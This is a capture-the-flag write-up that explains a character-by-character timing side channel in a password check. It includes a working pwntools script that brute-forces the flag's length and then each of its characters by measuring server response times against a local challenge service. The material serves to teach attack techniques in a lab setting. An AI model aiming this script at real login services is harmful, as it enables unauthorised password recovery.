# Who cares about SSI anyway Writeup

This challenge can be solved using a timing attack. Here is a step-by-step explanation of the exploit:

## Understanding the Vulnerability

The system compares the input password with the correct flag character by character. It introduces a delay for each correct character, due to system capacities. This delay can be measured to infer the correct characters of the flag.

## Finding the Password Length

The solution first determines the length of the password by sending increasingly longer strings until the response changes from "Wrong length" to something else.

## Exploiting the Timing Attack

1. For each position in the password, the script tries every possible character from the charset.
2. It measures the time taken for the server to respond.
3. The character that causes the longest delay is likely the correct one for that position.
4. This process is repeated for each position in the password until the entire flag is found.

# Solution

```python
from pwn import *
import time

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"

r = remote('localhost', 5000)
r.recvline()

print(f"[*] Finding password length...")
password_length = 0
for i in range(100):
    r.recvuntil(b'Your try? ')
    r.sendline(b'A' * i)
    if b'Wrong length' not in r.recvline():
        password_length = i
        break

if password_length == 0:
    print("[!] Password length not found")
    exit()
else:
    print(f"[+] Password length: {password_length}")

print("[*] Finding password...")
password = ["A"] * password_length
for i in range(password_length):
    tmp = [e for e in password]
    m = None
    for c in charset:
        r.recvuntil(b'Your try? ')
        tmp[i] = c
        r.sendline("".join(tmp).encode())
        now = time.time()
        res = r.recvline()
        t = time.time() - now
        print(f"[+] Trying: {''.join(tmp)} - {t}")
        if m is None or t > m[1]:
            m = (c, t)
    password[i] = m[0]
    print(f"[+] Password updated: {''.join(password)}")
```